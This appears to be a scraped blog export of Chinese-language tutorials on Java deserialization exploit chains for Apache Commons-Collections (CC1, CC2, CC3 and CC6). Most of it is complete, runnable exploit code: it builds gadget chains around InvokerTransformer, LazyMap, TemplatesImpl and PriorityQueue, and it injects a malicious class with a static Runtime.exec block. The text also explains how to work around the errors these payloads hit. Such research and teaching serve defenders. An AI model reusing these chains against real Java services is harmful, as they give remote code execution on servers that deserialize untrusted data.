org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport java.io.*;  \nimport java.lang.reflect.Constructor;  \nimport java.lang.reflect.InvocationHandler;  \nimport java.lang.reflect.Proxy;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \n// 正版 CC1 链最终 EXPpublic class LazyFinalEXP &#123;  \n    public static void main(String[] args) throws Exception &#123;  \n        Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数  \n new InvokerTransformer(\"getMethod\",  \n new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", null&#125;),  \n new InvokerTransformer(\"invoke\"  \n , new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),  \n new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;)  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);  \n  \n Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");  \n Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);  \n declaredConstructor.setAccessible(true);  \n InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  \n  \n Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()  \n                , new Class[]&#123;Map.class&#125;, invocationHandler);  \n invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  \n  \n serialize(invocationHandler);  \n unserialize(\"ser.bin\");  \n &#125;  \n        public static void serialize(Object obj) throws IOException &#123;  \n            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n oos.writeObject(obj);  \n &#125;  \n        public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;  \n            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n Object obj = ois.readObject();  \n return obj;  \n &#125;  \n&#125;\n\n\n成功！\n\n\n\n我们被代理的实例是这一个\nClass a = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\nConstructor aDeclaredConstructor = a.getDeclaredConstructor(Class.class, Map.class);\naDeclaredConstructor.setAccessible(true);\nInvocationHandler invocationHandler = (InvocationHandler) aDeclaredConstructor.newInstance(Override.class, decorateLazyMap);\n\n生成代理类，并使用反序列化调用计算器\nMap proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()  \n        , new Class[]&#123;Map.class&#125;, invocationHandler);  \ninvocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  \nserialize(invocationHandler);  \nunserialize(\"ser.bin\");\n\n\n0x04 修复手段官方这里的推荐修复方法是将 jdk 版本提升至 jdk8u71，我们来看一下为什么官方会推荐这种方法。\n1. 对于 TransformerMap 版的 CC1 链子对于 TransformerMap 版的 CC1 链子来说，jdk8u71 及以后的版本没有了能调用 ReadObject 中 setValue() 方法的地方。\n\n\n2. 对于正版 CC1 链子因为在8u71之后的版本反序列化不再通过defaultReadObject方式，而是通过readFields 来获取几个特定的属性，defaultReadObject 可以恢复对象本身的类属性，比如this.memberValues 就能恢复成我们原本设置的恶意类，但通过readFields方式，this.memberValues 就为null，所以后续执行get()就必然没发触发，这也就是高版本不能使用的原因\n\n0x05 小结\n小结部分主要来整理一下链子和我们的攻击思路。\n\n调用链 \n\tInvokeTransformer#transform\n\t\tLazyMap#get\n\t\t\tAnnotationInvocationHandler#readObject\n\t\t\t\n\n辅助链\nChainedTransformer\nConstantTransformer\nHashMap\nMap(Proxy)#entrySet\n\n","categories":["Java"],"tags":["Java"]},{"title":"Java反序列化Commons-Collections篇05-CC2链","url":"/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8705-CC2%E9%93%BE/","content":"CC2链\n\nJava 反序列化 Commons-Collections 篇 05 CC2 链0x01 前言过完前三条链子之后，看后续的链子简直不要太顺利 ~\n0x02 环境\nJDK8u65\nopenJDK 8u65\nMaven 3.6.3(其余版本可以先试试，不行再降版本)\nCommons-Collections 4.0\n\nMaven 下载 Commons-Collections 依赖。\n&lt;dependency>  \n &lt;groupId>org.apache.commons&lt;/groupId>  \n &lt;artifactId>commons-collections4&lt;/artifactId>  \n &lt;version>4.0&lt;/version>  \n&lt;/dependency>\n\n0x03 CC2 链分析\n首先分析这条链子，要先明白它存在的意义。\n\nCC2 这条链实际上是在 CC4 链基础上的修改，目的是为了避免使用 Transformer 数组。\n要用流程图来表示的话应当是如此。\n\n\n在 CC4 链的基础上，抛弃了用 InstantiateTransformer 类将 TrAXFilter 初始化，以及 TemplatesImpl.newTransformer() 这个步骤\n那么我们简单分析 CC2 链的前半部分，还是出现了 compare 这些，所以在 CC4 链中的 compare 部分是可用的。在 CC2 链最后部分是 TemplatesImpl 执行动态字节码，和 CC4 链最后的部分是相等的，我们可以直接搬进来。\n\n难点在于用 InvokerTransformer 的连接。\n\n0x04 CC2 链 EXP 编写我们先把 CC4 链的 EXP 粘贴一下，并且使用 InvokerTransform 连接链子。\n我们还是一步步来，首先是 TemplatesImpl 这里后面的链子\nTemplatesImpl templates = new TemplatesImpl();  \nClass templatesClass = templates.getClass();  \nField nameField = templatesClass.getDeclaredField(\"_name\");  \nnameField.setAccessible(true);  \nnameField.set(templates,\"Drunkbaby\");  \n  \nField bytecodesField = templatesClass.getDeclaredField(\"_bytecodes\");  \nbytecodesField.setAccessible(true);  \nbyte[] evil = Files.readAllBytes(Paths.get(\"E://Calc.class\"));  \nbyte[][] codes = &#123;evil&#125;;  \nbytecodesField.set(templates,codes);\n\n构造 InvokerTransformer 类去调用templates对象的newTransformer方法：\nInvokerTransformer invokerTransformer = new InvokerTransformer&lt;>(\"newTransformer\", new Class[]&#123;&#125;, new Object[]&#123;&#125;);  \n\n创建 TransformingComparator 类对象，传⼊一个临时的  Transformer 类对象，这是为了让代码能够不本地执行，在反序列化的时候执行。\nTransformingComparator transformingComparator = new TransformingComparator&lt;>(new ConstantTransformer&lt;>(1));\n\n创建 PriorityQueue 类对象 传入 transformingComparator 对象，但是此时向队列⾥添加的元素就是我们前⾯创建的 TemplatesImpl 对象了，这是因为最后调用 PriorityQueue.compare() 的时候是传入队列中的两个对象，然后 compare() 中调用 Transformer.transform(obj1) 的时候用的是传入的第一个对象作为参数，因此这里需要将 priorityQueue 队列中的第一个对象设置为构造好的 templates 对象，这里贪方便就两个都设置为 templates 对象了。\nPriorityQueue priorityQueue = new PriorityQueue&lt;>(transformingComparator);  \npriorityQueue.add(templates);  \npriorityQueue.add(templates);\n\n\n最后再将值通过反射改回来。\n\nClass c = transformingComparator.getClass();  \nField transformingField = c.getDeclaredField(\"transformer\");  \ntransformingField.setAccessible(true);  \ntransformingField.set(transformingComparator, invokerTransformer);\n\n\n最终完整的 EXP 如下\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport org.apache.commons.collections4.comparators.TransformingComparator;  \nimport org.apache.commons.collections4.functors.ConstantTransformer;  \nimport org.apache.commons.collections4.functors.InvokerTransformer;  \n  \nimport java.io.*;  \nimport java.lang.reflect.Field;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \nimport java.util.PriorityQueue;  \n  \n// 因为 CC2 是基于 CC4 的，所以大部分链子都差不多，直接写了  \npublic class CC2EXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        TemplatesImpl templates = new TemplatesImpl();  \n Class templatesClass = templates.getClass();  \n Field nameField = templatesClass.getDeclaredField(\"_name\");  \n nameField.setAccessible(true);  \n nameField.set(templates,\"Drunkbaby\");  \n  \n Field bytecodesField = templatesClass.getDeclaredField(\"_bytecodes\");  \n bytecodesField.setAccessible(true);  \n byte[] evil = Files.readAllBytes(Paths.get(\"E://Calc.class\"));  \n byte[][] codes = &#123;evil&#125;;  \n bytecodesField.set(templates,codes);  \n  \n InvokerTransformer invokerTransformer = new InvokerTransformer&lt;>(\"newTransformer\", new Class[]&#123;&#125;, new Object[]&#123;&#125;);  \n TransformingComparator transformingComparator = new TransformingComparator&lt;>(new ConstantTransformer&lt;>(1));  \n PriorityQueue priorityQueue = new PriorityQueue&lt;>(transformingComparator);  \n priorityQueue.add(templates);  \n priorityQueue.add(templates);  \n  \n Class c = transformingComparator.getClass();  \n Field transformingField = c.getDeclaredField(\"transformer\");  \n transformingField.setAccessible(true);  \n transformingField.set(transformingComparator, invokerTransformer);  \n serialize(priorityQueue);  \n unserialize(\"ser.bin\");  \n &#125;  \n    public static void serialize(Object obj) throws IOException &#123;  \n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n oos.writeObject(obj);  \n &#125;  \n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;  \n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n Object obj = ois.readObject();  \n return obj;  \n &#125;  \n&#125;\n\n\n0x05 小结这里小结就不用写太多了，前面流程图也画好了，一开始还是很不懂的，后面看懂了，爽的一笔。\nCC2 链区别与其他链子一点的区别在于没有用 Transformer 数组。不用数组是因为比如 shiro 当中的漏洞，它会重写很多动态加载数组的方法，这就可能会导致我们的 EXP 无法通过数组实现。\n","categories":["Java"],"tags":["Java"]},{"title":"Java反序列化Commons-Collections篇04-CC3链","url":"/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/","content":"CC3链\n\nJava 反序列化 Commons-Collections 篇 04-CC3 链0x01 前言最近忙着期末考试，不过关于反序列化的一些思路已经是更加熟练了，冲冲冲。\nCC3 链同之前我们讲的 CC1 链与 CC6 链的区别之处是非常大的。原本的 CC1 链与 CC6 链是通过 Runtime.exec() 进行命令执行的。而很多时候服务器的代码当中的黑名单会选择禁用 Runtime。\n而 CC3 链这里呢，则是通过动态加载类加载机制来实现自动执行恶意类代码的。\n\n所以下面，我们先来过一遍 Java 动态类加载机制。\n\n0x02 环境\njdk8u65\nCommons-Collections 3.2.1\n\n0x03 TemplatesImpl 解析\n在之前的 Java反序列化基础篇-05-类的动态加载 文章当中，我们讲到了一种利用 利用 ClassLoader#defineClass 直接加载字节码的手段。\n\n在这一条小链子当中，流程图可以绘制如下。\n\n\n这里我们可以正向看，首先是 loadClass()，它的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 findClass()。\n对于 findClass() 方法\n\n根据名称或位置加载 .class 字节码,然后使用 defineClass，代码实例如下。\n通常由子类去实现\n\nprotected Class&lt;?> findClass(String name) throws ClassNotFoundException &#123;\n    throw new ClassNotFoundException(name);\n&#125;\n\n// findClass 方法的源代码\n\nclass NetworkClassLoader extends ClassLoader &#123;\n        String host;\n        int port;\n\n         public Class findClass(String name) &#123;\n            byte[] b = loadClassData(name);\n             return defineClass(name, b, 0, b.length);\n         &#125;\n\n         private byte[] loadClassData(String name) &#123;\n             // load the class data from the connection\n         &#125;\n&#125;\n// 子类的实现方式\n\n\ndefineClass() 的作用是处理前面传入的字节码，将其处理成真正的 Java 类。\n\n\n此时的 defineClass() 方法是有局限性的，因为它只是加载类，并不执行类。若需要执行，则需要先进行 newInstance() 的实例化。\n\n现在我们的 defineClass() 方法的作用域为 protected，我们需要找到作用域为 public 的类，方便我们利用。照样 find usages\n在 TemplatesImpl 类的 static class TransletClassLoader 中找到了我们能够运用的类。\n\n\n这里的 defineClass() 方法没有标注作用域，默认为 defalut，也就是说自己的类里面可以调用，我们继续 find usages\n\n\n因为作用域是 private，所以我们看一看谁调用了 defineTransletClasses() 方法\n\n这里还有一点需要注意的，_bytecodes 的值不能为 null，否则会抛出异常。\n\n\n\n还是同一个类下的 getTransletInstance() 方法调用了 defineTransletClasses() 方法，并且这里有一个 newInstance() 实例化的过程，如果能走完这个函数那么就能动态执行代码，但是因为它是私有的，所以继续找。\n\n\n\n找到了一个 public 的方法，接下来我们开始利用。\n\n0x04 TemplatesImpl 利用1. 利用逻辑在分析过程我们说到只要走过 getTransletInstance() 方法即可，因为这个方法内调用了 newInstance() 方法，用伪代码来表示的话如下。\nTemplatesImpl templates = new TemplatesImpl();\ntemplates.newTransformer();  // 因为是一层层调用的，我们需要后续赋值\n\n\n如果没有一堆限制条件，我们现在的这两行代码就可以进行命令执行了。这里的限制条件指的是类似于下图的这一些。\n\n\n\n如果此处的 _name 为 null，则后续的代码都不执行，也到不了我们调用 newInstance() 实例化的地方。\n并且这里我们需要让 _classs 的值为空，才能进入调用 newInstance()\n这些便是限制条件\n2. 分析限制条件并编写 EXP\n这里的 TemplatesImpl 通过反射修改其值。\n\n\n\n先列举一些需要我们进行赋值的属性值，用反射修改属性值。赋值这里需要”对症下药”，也就是需要什么类型的值，我们就给什么类型。\n\n\n_class 的值应当为 null，我们去看 TemplatesImpl 的构造方法中没有给 _class 赋初值，所以不用管它。\n_name 的值，这里需要的是 String，所以我们简单赋个 String 即可。\n\n_bytecodes 这里比较难，我们过一遍。\n\n_bytecodes 的值，这里需要的是一个二维数组，所以我们创建一个二维数组。但是 _bytecodes 作为传递进 defineClass 方法的值是一个一维数组。而这个一维数组里面我们需要存放恶意的字节码。这一段伪代码可以这样写。\n在写这段小 poc 之前，要先写一个 Calc.class 的恶意类并编译。\nimport java.io.IOException;  \n  \npublic class Calc &#123;  \n    static &#123;  \n        try &#123;  \n            Runtime.getRuntime().exec(\"calc\");  \n &#125; catch (IOException e)&#123;  \n            e.printStackTrace();  \n &#125;  \n    &#125;  \n&#125;\n\n直接编写静态代码块就可以了，因为在类初始化的时候会自动执行代码。\nbyte[] evil = Files.readAllBytes(Paths.get(\"E://Calc.class\"));  \nbyte[][] codes = &#123;evil&#125;;\n\n\n_tfactory 这里比较难，我们也过一遍，这两个过完之后，写其他的就没什么问题了。\n\n_tfactory 的值在 TemplatesImpl 这一类中被定义如下，关键字是 transient，这就导致了这个变量在序列化之后无法被访问。\nprivate transient TransformerFactoryImpl _tfactory = null;\n\n直接修改是不行的，但是我们这里的利用要求比较低，只要让 _tfactory 不为 null 即可，我们去看一看 _tfactory 的其他定义如何。\n在 readObject() 方法中，找到了 _tfactory 的初始化定义。\n\n\n所以这里直接在反射中将其赋值为 TransformerFactortImpl 即可，伪代码如下。\nField tfactoryField = templatesClass.getDeclaredField(\"_tfactory\");  \ntfactoryField.setAccessible(true);  \ntfactoryField.set(templates, new TransformerFactoryImpl());\n\n\n最终完整的 EXP 应该如下\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \n  \nimport java.lang.reflect.Field;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \n  \n// TemplatesImpl 的 EXP 编写  \npublic class TemplatesImplEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        TemplatesImpl templates = new TemplatesImpl();  \n Class templatesClass = templates.getClass();  \n Field nameField = templatesClass.getDeclaredField(\"_name\");  \n nameField.setAccessible(true);  \n nameField.set(templates,\"Drunkbaby\");  \n  \n Field bytecodesField = templatesClass.getDeclaredField(\"_bytecodes\");  \n bytecodesField.setAccessible(true);  \n byte[] evil = Files.readAllBytes(Paths.get(\"E://Calc.class\"));  \n byte[][] codes = &#123;evil&#125;;  \n bytecodesField.set(templates,codes);  \n  \n Field tfactoryField = templatesClass.getDeclaredField(\"_tfactory\");  \n tfactoryField.setAccessible(true);  \n tfactoryField.set(templates, new TransformerFactoryImpl());  \n templates.newTransformer();  \n &#125;  \n&#125;\n\n解决报错，挖 0day 的必经之路！\n按照道理来说，上面的 EXP 已经挺完美的了，但是在运行的时候我不但没有弹出计算器，反而还报错了。\n\n\n\n这里报错是由于空指针报错，我们去 TemplatesImpl 下打断点调试一下。\n我是在 393 行 if (_bytecodes == null) 那里打断点的。调试之后发现问题出在这儿。\n\n\n\n418 行，判断在 defineClass() 方法中传进去的参数 b 数组的字节码是否继承了 ABSTRACT_TRANSLET 这个父类，如果没有则抛出异常，所以我们需要去恶意类中继承 ABSTRACT_TRANSLET 这个父类。\n\n或者我们可以将 _auxClasse 赋值，使其不为 null。但是如果没有继承 ABSTRACT_TRANSLET 这个父类，会导致 _transletIndex 的值为 -1，在第 426 行的判断当中跳出程序。\n\n修改完毕之后，我们的弹计算器就成功了。\n\n\n\n0x05 CC1 链的 TemplatesImpl 的实现方式\nTemplatesImpl 只是将原本的命令执行变成代码执行的方式所以在不考虑黑名单的情况下，如果可以进行命令执行，则一定可以通过动态加载字节码进行代码执行。\n\n\n如图，链子不变，只是最后的命令执行方式变了。\n\n\n\n所以这里我们先尝试修改命令执行的方法，这时候的链子应该是从后往前的，也就是确定了命令执行的方式之后，将传参设置为动态加载的字节码。并且前面的链子不变。\n暂时的 EXP 是这样的。\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.map.TransformedMap;  \n  \nimport java.io.*;  \nimport java.lang.annotation.Target;  \nimport java.lang.reflect.Constructor;  \nimport java.lang.reflect.Field;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \npublic class CC1TemplatesEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        TemplatesImpl templates = new TemplatesImpl();  \n Class templatesClass = templates.getClass();  \n Field nameField = templatesClass.getDeclaredField(\"_name\");  \n nameField.setAccessible(true);  \n nameField.set(templates,\"Drunkbaby\");  \n  \n Field bytecodesField = templatesClass.getDeclaredField(\"_bytecodes\");  \n bytecodesField.setAccessible(true);  \n byte[] evil = Files.readAllBytes(Paths.get(\"E://Calc.class\"));  \n byte[][] codes = &#123;evil&#125;;  \n bytecodesField.set(templates,codes);  \n  \n Field tfactoryField = templatesClass.getDeclaredField(\"_tfactory\");  \n tfactoryField.setAccessible(true);  \n tfactoryField.set(templates, new TransformerFactoryImpl());  \n // templates.newTransformer();  \n  \n Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(templates),  \n new InvokerTransformer(\"newTransformer\", null, null)  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n chainedTransformer.transform(1);   \n&#125;\n\n最后一句，传入 chainedTransformer.transform(1) 是因为前面我们定义了 new ConstantTransformer(templates)，这个类是需要我们传参的，传入 1 即可。\n\n\n\nOK，弹计算器成功，接下来是把 CC1 链的前半部分拿进去。\n\n完整的 EXP 如下\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.map.TransformedMap;  \n  \nimport java.io.*;  \nimport java.lang.annotation.Target;  \nimport java.lang.reflect.Constructor;  \nimport java.lang.reflect.Field;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \npublic class CC1TemplatesEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        TemplatesImpl templates = new TemplatesImpl();  \n Class templatesClass = templates.getClass();  \n Field nameField = templatesClass.getDeclaredField(\"_name\");  \n nameField.setAccessible(true);  \n nameField.set(templates,\"Drunkbaby\");  \n  \n Field bytecodesField = templatesClass.getDeclaredField(\"_bytecodes\");  \n bytecodesField.setAccessible(true);  \n byte[] evil = Files.readAllBytes(Paths.get(\"E://Calc.class\"));  \n byte[][] codes = &#123;evil&#125;;  \n bytecodesField.set(templates,codes);  \n  \n Field tfactoryField = templatesClass.getDeclaredField(\"_tfactory\");  \n tfactoryField.setAccessible(true);  \n tfactoryField.set(templates, new TransformerFactoryImpl());  \n // templates.newTransformer();  \n  \n Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(templates),  \n new InvokerTransformer(\"newTransformer\", null, null)  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n //   chainedTransformer.transform(1);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n hashMap.put(\"value\",\"drunkbaby\");  \n Map&lt;Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);  \n Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");  \n Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);  \n aihConstructor.setAccessible(true);  \n Object o = aihConstructor.newInstance(Target.class, transformedMap);  \n // 序列化反序列化  \n serialize(o);  \n unserialize(\"ser.bin\");  \n &#125;  \n    public static void serialize(Object obj) throws IOException &#123;  \n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n oos.writeObject(obj);  \n &#125;  \n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;  \n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n Object obj = ois.readObject();  \n return obj;  \n &#125;  \n&#125;\n\n\n\n\n然后是 Yso 正版链子的 TemplatesImpl 的实现方式。\n\nEXP 如下\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport java.io.*;  \nimport java.lang.reflect.Constructor;  \nimport java.lang.reflect.Field;  \nimport java.lang.reflect.InvocationHandler;  \nimport java.lang.reflect.Proxy;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \n// CC1 Yso 的正版链子，用 TemplatesImpl 实现 EXPpublic class CC1YsoTemplatesEXP &#123;  \n    public static void main(String[] args) throws Exception &#123;  \n        TemplatesImpl templates = new TemplatesImpl();  \n Class templatesClass = templates.getClass();  \n Field nameField = templatesClass.getDeclaredField(\"_name\");  \n nameField.setAccessible(true);  \n nameField.set(templates, \"Drunkbaby\");  \n  \n Field bytecodesField = templatesClass.getDeclaredField(\"_bytecodes\");  \n bytecodesField.setAccessible(true);  \n byte[] evil = Files.readAllBytes(Paths.get(\"E://Calc.class\"));  \n byte[][] codes = &#123;evil&#125;;  \n bytecodesField.set(templates, codes);  \n  \n Field tfactoryField = templatesClass.getDeclaredField(\"_tfactory\");  \n tfactoryField.setAccessible(true);  \n tfactoryField.set(templates, new TransformerFactoryImpl());  \n //     templates.newTransformer();  \n Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(templates), // 构造 setValue 的可控参数  \n new InvokerTransformer(\"newTransformer\", null, null)  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);  \n  \n Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");  \n Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);  \n declaredConstructor.setAccessible(true);  \n InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  \n  \n Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()  \n                , new Class[]&#123;Map.class&#125;, invocationHandler);  \n invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  \n  \n serialize(invocationHandler);  \n unserialize(\"ser.bin\");  \n &#125;  \n  \n    public static void serialize(Object obj) throws IOException &#123;  \n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n oos.writeObject(obj);  \n &#125;  \n  \n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;  \n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n Object obj = ois.readObject();  \n return obj;  \n &#125;  \n&#125;\n\n\n\n0x06 CC6 链的 TemplatesImpl 的实现方式上面已经讲过原理了，我这里就直接把 EXP 拿出来。\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.keyvalue.TiedMapEntry;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport java.io.*;  \nimport java.lang.reflect.Field;  \nimport java.nio.file.Files;  \nimport java.nio.file.Paths;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \n// CC6 Yso 的正版链子，用 TemplatesImpl 实现 EXPpublic class CC6TemplatesEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        TemplatesImpl templates = new TemplatesImpl();  \n Class templatesClass = templates.getClass();  \n Field nameField = templatesClass.getDeclaredField(\"_name\");  \n nameField.setAccessible(true);  \n nameField.set(templates, \"Drunkbaby\");  \n  \n Field bytecodesField = templatesClass.getDeclaredField(\"_bytecodes\");  \n bytecodesField.setAccessible(true);  \n byte[] evil = Files.readAllBytes(Paths.get(\"E://Calc.class\"));  \n byte[][] codes = &#123;evil&#125;;  \n bytecodesField.set(templates, codes);  \n  \n Field tfactoryField = templatesClass.getDeclaredField(\"_tfactory\");  \n tfactoryField.setAccessible(true);  \n tfactoryField.set(templates, new TransformerFactoryImpl());  \n //     templates.newTransformer();  \n Transformer[] transformers = new Transformer[]&#123;  \n                new ConstantTransformer(templates),  \n new InvokerTransformer(\"newTransformer\", null, null)  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer(\"five\")); // 防止在反序列化前弹计算器  \n TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"key\");  \n HashMap&lt;Object, Object> expMap = new HashMap&lt;>();  \n expMap.put(tiedMapEntry, \"value\");  \n lazyMap.remove(\"key\");  \n  \n // 在 put 之后通过反射修改值  \n Class&lt;LazyMap> lazyMapClass = LazyMap.class;  \n Field factoryField = lazyMapClass.getDeclaredField(\"factory\");  \n factoryField.setAccessible(true);  \n factoryField.set(lazyMap, chainedTransformer);  \n  \n serialize(expMap);  \n unserialize(\"ser.bin\");  \n &#125;  \n    public static void serialize(Object obj) throws IOException &#123;  \n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n oos.writeObject(obj);  \n &#125;  \n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;  \n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n Object obj = ois.readObject();  \n return obj;  \n &#125;  \n&#125;\n\n成功弹出计算器。\n0x07 回归正题 ———— CC3 链\n在去看 yso 的 CC3 链子之前，我觉得应该给自己多一点思考空间。\n\n1. CC3 链分析因为只需要调用 TemplatesImpl 类的 newTransformer() 方法，便可以进行命令执行，所以我们去到 newTransformer() 方法下，find usages。\n\n\n\n这里主要是找到了四个，我们一个个讲解一下为什么是 TrAXFilter 而不是其他的。\n\nProcess 这个在 main 里面，是作为一般对象用的，所以不用它。\n第二个 getOutProperties，是反射调用的方法，可能会在 fastjson 的漏洞里面被调用。\nTransformerFactoryImpl 不能序列化，如果还想使用它也是也可能的，但是需要传参，我们需要去找构造函数。而它的构造函数难传参。\n最后，TrAXFilter，它也是不能序列化的，但是我们去到它的构造函数看，是有搞头的。\n\n\n这个类的构造函数中有这一条语句，所以我们只要执行这个类的构造函数即可命令执行。\n_transformer = (TransformerImpl) templates.newTransformer();\n\nCC3 这里的作者没有调用 InvokerTransformer，而是调用了一个新的类 InstantiateTransformer。\n\nInstantiateTransformer 这个类是用来初始化 Transformer 的，我们去找 InstantiateTransformer 类下的 transform 方法。\n\n完美契合我们的需求！\n\n\n接着，来构造 EXP\n2. CC3 链构造 EXP首先，我们后半段的命令执行是不变的，也就是 TemplatesImpl 的 EXP 是不变的。\n\n我们先编写后半部分链子的 EXP\n\nInstantiateTransformer 类这里的传参我们去看一下，要求传入如此的参数。\npublic InstantiateTransformer(Class[] paramTypes, Object[] args) &#123;  \n    super();  \n iParamTypes = paramTypes;  \n iArgs = args;  \n&#125;\n\n那我们这里传入 new Class[]&#123;Templates.class&#125; 与 new Object[]&#123;templates&#125; 即可\n完整的后半部分链子的 EXP\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \nimport org.apache.commons.collections.functors.InstantiateTransformer;  \n  \nimport javax.xml.transform.Templates;  \nimport java.lang.reflect.Field;  \nimport 